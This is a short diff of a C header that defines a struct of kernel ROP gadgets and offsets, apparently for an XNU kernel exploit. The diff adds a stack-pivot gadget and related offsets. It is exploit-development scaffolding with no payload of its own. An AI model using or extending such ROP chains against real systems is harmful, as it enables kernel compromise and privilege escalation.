@@ -30,20 +30,21 @@ typedef struct
     uint64_t mac_policy_list;
     uint64_t hibernate_machine_init;
     uint64_t _hibernateStats;
-    //uint64_t add__rdi__ecx;
+    //uint64_t add__rdi__ecx; XXX
     uint64_t memcpy_gadget;
     uint64_t jmp__vtab1_;
     uint64_t mov_rsi_r15_call__vtab0_;
-    uint64_t mov_rdi__rax_8__call__rax_;
+    //uint64_t mov_rdi__rax_8__call__rax_;
+    uint64_t stack_pivot;
     uint64_t mov_rsp_rsi_call_rdi;
-    uint64_t add_rsp_0x28;
+    uint64_t add_rsp_0x20_pop_rbp;
     uint64_t pop_rax;
     uint64_t pop_rdi;
     uint64_t pop_rsi;
     uint64_t pop_rdx;
     uint64_t pop_rcx;
     uint64_t pop_r8_pop_rbp;
-    uint64_t mov_r9__rbp_0x38__call_rax;
+    uint64_t mov_r9__rbp_X__call_rax;
     uint64_t push_rbp_mov_rax__rdi__pop_rbp;
     uint64_t mov_rax__rdi__pop_rbp;
     uint64_t mov__rdi__rax_pop_rbp;
@@ -55,6 +56,9 @@ typedef struct
     // unslid
     uint64_t taggedRelease_vtab_offset;
     uint64_t OSArray_array_offset;
+    uint64_t stack_pivot_load_off;
+    uint64_t stack_pivot_call_off;
+    uint64_t mov_r9__rbp_X__off;
 } rop_t;
 
 int rop_gadgets(rop_t *rop, void *kernel);
